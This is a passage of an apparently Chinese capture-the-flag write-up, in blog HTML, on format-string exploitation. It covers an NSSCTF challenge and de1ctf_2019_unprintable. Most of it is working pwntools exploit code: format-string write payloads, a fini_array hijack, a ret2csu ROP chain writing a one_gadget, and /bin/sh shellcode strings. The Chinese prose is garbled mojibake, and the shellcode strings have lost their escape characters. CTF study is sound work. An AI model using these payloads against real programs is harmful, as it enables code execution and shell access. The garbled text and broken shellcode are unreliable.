class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">25151</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your name: \n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">ret_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x140</span>+<span class="number">48</span></span><br><span class="line">leak(<span class="string">&#x27;ret_addr&#x27;</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;%35c%8$hhnaaaaaa&#x27;</span> + p64(ret_addr)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;yourself~\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>å¾ˆç»å…¸çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><blockquote><p>64ä½æ ¼å¼å­—ç¬¦ä¸²æ¼æ´çš„åç§»åˆ°æ ˆä¸Šæ˜¯ä»rspä¸‹é¢ä¸€ä¸ªå¼€å§‹çš„</p><ul><li>%hhn å†™ä¸€å­—èŠ‚</li><li>%hn å†™ä¸¤å­—èŠ‚</li><li>%n æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚å°†æ ˆä¸Šçš„å†…å®¹ä½œä¸ºåœ°å€è§£æï¼Œç„¶åæ”¹å˜è¿™ä¸ªåœ°å€ä¸Šçš„å†…å®¹ï¼Œå†™å››å­—èŠ‚</li><li>%ln 32ä½å†™å››å­—èŠ‚ï¼Œ64ä½å†™å…«å­—èŠ‚</li><li>%lln å†™å…«å­—èŠ‚</li></ul></blockquote><p>å¤ªä¹…æ²¡åšéƒ½ç€äº†é“äº†</p><h1 id="de1ctf-2019-unprintable"><a href="#de1ctf-2019-unprintable" class="headerlink" title="de1ctf_2019_unprintable"></a>de1ctf_2019_unprintable</h1><p>æœ¬é¢˜çš„ç¯å¢ƒæ˜¯libc-2.23.soçš„ï¼Œå¦‚æœç‰ˆæœ¬ä¸ä¸€æ ·ä¼šå¯¼è‡´æ ˆç©ºé—´ä¸ä¸€æ ·ä¸èƒ½getshellï¼ˆä¸€æ™šä¸Š(lllï¿¢Ï‰ï¿¢)å¾—æ¥çš„</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115389.png" alt="image-20240512214109727"></p><h2 id="é™æ€åˆ†æ-2"><a href="#é™æ€åˆ†æ-2" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Ch4r1l3&#x27;s printf test&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is your gift: %p\n&quot;</span>, v3);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ç»™äº†æ ˆçš„åœ°å€ï¼Œç„¶åå…³é—­äº†æ ‡å‡†è¾“å‡ºæµï¼Œåˆæœ‰ä¸€ä¸ªéæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆ0x601060ï¼‰ï¼ˆbuffæ‹‰æ»¡äº†ï¼ˆbushi</p><p>è¿™é¢˜è€ƒåˆ°ä¸€ä¸ªå°trickï¼š</p><p>exitä¼šè°ƒç”¨<code>dl_fini</code>å‡½æ•°ï¼Œæˆ‘ä»¬çœ‹çœ‹<code>dl_fini</code>å‡½æ•°çš„æºç </p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115390" alt="img"></p><p>ä¼šå‘ç°æ‰§è¡Œçš„æ—¶å€™è°ƒç”¨(l-&gt;l_addr+l-&gt;l_info[DY_FINI_ARRAY]-&gt;d_un.d_ptr)ï¼Œæœ¬æ¥l-&gt;l_addrä¸º0ï¼Œè€Œl-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptræŒ‡é’ˆæŒ‡å‘ç¨‹åºä¸­çš„fini_arrayæ®µçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptrçš„å€¼ä¸º0x0000000000600DD8</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115391.png" alt="image-20240512224201859" style="zoom:33%;" /><p>è¿™æ—¶å°±é€šè¿‡è¦†ç›–I-&gt;I_addræ¥åŠ«æŒfini_arrayçš„åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115392.png" alt="image-20240513202751753"></p><p>æ‰§è¡Œexitä¸­çš„è°ƒç”¨å‡½æ•°ï¼ˆå‘ç°é›€æ°</p><p>å‘ç°æ ˆä¸Š<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115393.png" alt="image-20240512224609287"></p><p>æœ‰ä¸ªI-&gt;I_addrçš„åœ°å€ï¼Œå°±å¯ä»¥é€šè¿‡æ”¹è¿™ä¸ªåœ°å€ä¸Šçš„å€¼æ¥åç§»</p><blockquote><p>å…¶ä¸­å¯ä»¥é€šè¿‡çœ‹è¿™ä¸ªä¸ä¼—ä¸åŒçš„é¢œè‰²å¯ä»¥çŸ¥é“è¿™æ˜¯æ¥è‡ªäºld.soæ–‡ä»¶é‡Œçš„ï¼Œè€Œè¿™ä¸ªåœ°å€ä¸ºä»€ä¹ˆæ°å¥½å‡ºç°åœ¨æ ˆä¸Šå¯èƒ½æ˜¯å› ä¸ºåœ¨exitå‡½æ•°ä¸­ï¼Œä¼šé€šè¿‡è¿™ä¸ªæ¥è°ƒç”¨dl_finiå‡½æ•°</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115394.png" alt="image-20240512224709178"></p><p>é€šè¿‡fmtargæŸ¥åç§»ï¼ˆé—®å°±æ˜¯æ‡’ï¼ˆbushi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =tbs(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(read_addr)</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªä¾¿å¯ä»¥äºŒæ¬¡åˆ©ç”¨readäº†</p><p>è€Œç¬¬äºŒæ¬¡çš„printfå¾—åˆ°çš„æ ˆç©ºé—´æœ‰ç€æˆå †çš„ropé“¾ï¼Œéå¸¸å¥½çš„è¿›è¡Œæ„é€ </p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115395.png" alt="image-20240513195457206"></p><p>1å’Œ2æŒ‡å‘çš„éƒ½æ˜¯æ ˆç©ºé—´ï¼Œèƒ½å®ç°åœ¨æ ˆç©ºé—´çš„ä»»æ„å†™ï¼Œè€Œ2èƒ½å®ç°printf_loopï¼Œæˆ–è€…ripçš„ä»»æ„å†™</p><p>æœ‰äº†ä»»æ„å†™ä¹‹åå°±è¦ç”¨ROPæ¥getshelläº†</p><p>ï¼ˆåœ¨æ­¤å‘ç°è¿™é¢˜çš„expæœ‰ç‚¹å¤æ‚ï¼Œå› æ­¤åªåšæ€è·¯ä¸Šçš„åˆ©ç”¨ï¼Œå°±ä¸æ‰“äº†ï¼ˆç­‰ä¹‹åå†æ¬¡é‡åˆ°ç›¸ä¼¼çš„é¢˜ç›®å†è¿›è¡Œåˆ©ç”¨â‰§ ï¹ â‰¦</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115396.png" alt="image-20240513200455427"></p><p>åœ¨libc_csu_initä¸­å¯ä»¥æ§åˆ¶rbx rbp r12 r13 r14 r15</p><p>ç„¶åæœ‰ä¸€ä¸ªrop</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006E8                 adc     <span class="section">[rbp+48h]</span>, edx</span><br></pre></td></tr></table></figure><p>å®ƒçš„ä½œç”¨æ˜¯å°†exp+[rbp+48h]çš„å€¼ä¹‹åå­˜å‚¨åœ¨rbp+48hä¸­ï¼ˆæœ€ç¥å¥‡çš„åœ°æ–¹ï¼Œç¬¬ä¸€æ¬¡åˆ©ç”¨è¿™ç§rop</p><p>è€Œå…¶ä¸­çš„edxå’Œrbpéƒ½æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥å®ç°ä¸€æ¬¡ä»»æ„å†™ã€‚</p><p>å¯ä»¥çœ‹åˆ°ç¨‹åºç©ºé—´é‡Œå­˜åœ¨stderr,stdin,stdoutï¼Œå®ƒä»¬éƒ½æŒ‡å‘libcï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹å®ƒä»¬ä¸ºone_gadgetæ¥getshellã€‚</p><p>åœ¨å…³é—­aslrçš„æƒ…å†µä¸‹stderrå’Œone_gadgetåˆ†åˆ«ä¸ºï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stderr</span> = <span class="number">0</span>x601040  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line"><span class="attr">one</span>= <span class="number">0</span>x7ffff7afe147<span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br></pre></td></tr></table></figure><p>è®¡ç®—åç§»ä¿®æ”¹å³å¯ã€‚</p><p>ä¿®æ”¹å®Œä¹‹åå†æ¬¡åˆ©ç”¨ret2csuä¼ stderrçš„åœ°å€ç»™r12ï¼Œ**æœ€åè°ƒç”¨call qword ptr [r12+rbx*8]**æ‹¿åˆ°shellã€‚</p><p>ï¼ˆéå¸¸å¥½çš„æ€è·¯è®©æˆ‘å¤§è„‘æ—‹è½¬</p><p>é™„ä¸Šå®Œæ•´exp ï¼šï¼ˆ<a href="https://www.anquanke.com/post/id/183859#h2-0">from</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pdbg.local(<span class="string">&quot;&quot;</span>)</span><br><span class="line">pdbg.debug(<span class="string">&quot;2.23&quot;</span>)</span><br><span class="line">pdbg.remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,)</span><br><span class="line"></span><br><span class="line">switch=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> switch==<span class="number">1</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">2</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">3</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;remote&quot;</span>)</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">bp      = <span class="keyword">lambda</span> bkp                :pdbg.bp(bkp)</span><br><span class="line"><span class="comment">#elf=pdbg.elf</span></span><br><span class="line"><span class="comment">#libc=pdbg.libc</span></span><br><span class="line">sh_x86_18=<span class="string">&quot;x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    pop_rsp=<span class="number">0x40082d</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;This is your gift: &#x27;</span>)</span><br><span class="line">    stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#if stack&amp;0xffff&gt;0x2000:</span></span><br><span class="line">    <span class="comment">#   p.close()</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line">    payload1=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span></span><br><span class="line">    payload1=payload1.ljust(<span class="number">16</span>,<span class="string">&#x27;x00&#x27;</span>)+p64(<span class="number">0x4007A3</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload1)</span><br><span class="line">    bp([<span class="number">0x4007c1</span>])</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload2)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    stack_tail=(stack-<span class="number">280</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    payload3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x48</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x48</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload3)</span><br><span class="line">    <span class="comment">#get arbitray write</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)  <span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)<span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10a0</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">2</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">2</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># merge heap and ROP</span></span><br><span class="line">    prbp = <span class="number">0x400690</span> <span class="comment">#pop rbp;ret;</span></span><br><span class="line">    prsp = <span class="number">0x40082d</span> <span class="comment">#pop rsp r13 r14 r15 ;ret</span></span><br><span class="line">    adc = <span class="number">0x4006E8</span>  </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    adc    DWORD PTR [rbp+0x48],edx</span></span><br><span class="line"><span class="string">    mov    ebp,esp</span></span><br><span class="line"><span class="string">    call   0x400660 &lt;deregister_tm_clones&gt;</span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    mov    byte ptr [rip + 0x20094e], 1 &lt;0x601048&gt;</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov    eax,0x601017</span></span><br><span class="line"><span class="string">    push   rbp</span></span><br><span class="line"><span class="string">    sub    rax,0x601010</span></span><br><span class="line"><span class="string">    cmp    rax,0xe</span></span><br><span class="line"><span class="string">    mov    rbp,rsp</span></span><br><span class="line"><span class="string">    jbe    0x400690 </span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    ret   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    arsp = <span class="number">0x0400848</span> <span class="comment">#add    rsp,0x8;ret</span></span><br><span class="line">    prbx = <span class="number">0x40082A</span> <span class="comment">#pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line">    call = <span class="number">0x400810</span> <span class="comment">#mov    rdx,r13</span></span><br><span class="line">                    <span class="comment">#mov    rsi,r14</span></span><br><span class="line">                    <span class="comment">#mov    edi,r15d</span></span><br><span class="line">                    <span class="comment">#call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line">    stderr = <span class="number">0x601040</span>  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line">    one= <span class="number">0x7ffff7afe147</span><span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br><span class="line">    rop=<span class="number">0x6010a0</span></span><br><span class="line">    payload6 = p64(arsp)*<span class="number">3</span></span><br><span class="line">    <span class="comment">#                   rbx   rbp      r12     r13    r14 r15</span></span><br><span class="line">    payload6 += flat(prbx,<span class="number">0</span>,stderr-<span class="number">0x48</span>,rop,<span class="number">0xFFD2BC07</span>,<span class="number">0</span>,  <span class="number">0</span>,  call)</span><br><span class="line">    payload6 += flat(adc,<span class="number">0</span>,prbx,<span class="number">0</span>,<span class="number">0</span>,stderr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x400819</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x82d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">    payload5=payload5.ljust(<span class="number">0x40</span>,<span class="string">&#x27;x00&#x27;</span>)+payload6</span><br><span class="line"></span><br><span class="line">    <span class="comment">#bp([0x4007c1])</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span 